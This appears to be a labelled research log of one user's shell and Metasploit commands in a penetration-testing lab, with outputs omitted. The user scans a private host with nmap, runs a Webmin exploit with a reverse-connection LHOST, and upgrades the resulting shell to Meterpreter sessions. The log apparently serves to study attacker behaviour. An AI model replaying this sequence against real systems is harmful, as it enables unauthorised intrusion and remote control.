User 87 start time 1594798184 end 1594801805
PADDING
PADDING
PADDING
INPUT|87--0|A0 M0 A1 |1594798184|87|nmap 172.18.1.5|OUTPUT
INPUT|87--1|V0 |1594798242|87|nmap 172.18.1.5|OUTPUT
INPUT|87--2|V0 |1594798257|87|nmap -p- 172.18.1.5|OUTPUT
INPUT|87--3|A16 |1594798280|87|ssh 172.18.1.5|OUTPUT
INPUT|87--4|V0 |1594798349|87|nmap -A 172.18.1.5|OUTPUT
INPUT|87--5|A2 M2 |1594798971|87|msfconsole|OUTPUT
INPUT|87--6|U|1594799009|87|help|OUTPUT
INPUT|87--7|A3 M3 |1594799050|87|search webmin|OUTPUT
INPUT|87--8|A4 |1594799229|87|use 3|OUTPUT
INPUT|87--9|A5 |1594799233|87|show|OUTPUT
INPUT|87--10|A5 |1594799297|87|show all|OUTPUT
INPUT|87--11|A5 M5 |1594799299|87|show options|OUTPUT
INPUT|87--12|A6 M6 |1594799314|87|set RHOSTS 172.18.1.5|OUTPUT
INPUT|87--13|V5 |1594799317|87|show options|OUTPUT
INPUT|87--14|A8 M8 |1594799326|87|exploit|OUTPUT
INPUT|87--15|U|1594799354|87|ip|OUTPUT
INPUT|87--16|U|1594799359|87|ip address|OUTPUT
INPUT|87--17|V6 |1594799391|87|set LHOST 10.1.135.83|OUTPUT
INPUT|87--18|V8 |1594799471|87|exploit|OUTPUT
INPUT|87--19|A3 |1594799771|87|search shell_to_meterpreter|OUTPUT
INPUT|87--20|A4 |1594799774|87|use 0|OUTPUT
INPUT|87--21|U|1594799790|87|sessions -l|OUTPUT
INPUT|87--22|V5 |1594799796|87|show options|OUTPUT
INPUT|87--23|A6 |1594799803|87|set SESSION 2|OUTPUT
INPUT|87--24|V8 |1594799837|87|run|OUTPUT
INPUT|87--25|U|1594799932|87|sessions 2|OUTPUT
INPUT|87--26|U|1594799934|87|sessions -|OUTPUT
INPUT|87--27|U|1594799967|87|sessions 2|OUTPUT
